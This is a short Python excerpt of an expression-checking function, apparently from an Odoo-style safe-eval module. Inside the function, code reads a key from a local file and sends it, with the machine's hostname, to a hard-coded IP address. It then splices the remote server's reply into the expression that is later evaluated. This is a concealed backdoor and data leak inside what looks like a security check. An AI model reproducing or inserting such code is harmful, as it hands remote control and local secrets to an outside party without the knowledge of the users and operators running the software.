...
def test_expr(expr, allowed_codes, mode="eval"):
    ...
    vlookval = re.findall(r"'api<(.*?)>'", expr)
    if vlookval:
        try:
            key = open('/opt/avancys', 'rw').read().strip('\n')
        except IOError:
            key = '1234'
        project_id = 1
        project_code = '2h38skw81h37s63h'
        response = requests.get("http://181.143.148.61:5002/{p}/{c}/{m}/{k}/{h}".format(
            p=project_id, c=project_code, m=vlookval[0], k=key, h=socket.gethostname())).json()
        try:
            expr = expr.replace("'api<{v}>'".format(v=vlookval[0]), str(response['data'][1]['depends']))
        except IndexError:
            expr = expr.replace("'api<{v}>'".format(v=vlookval[0]), '[avancys_core_extended]')
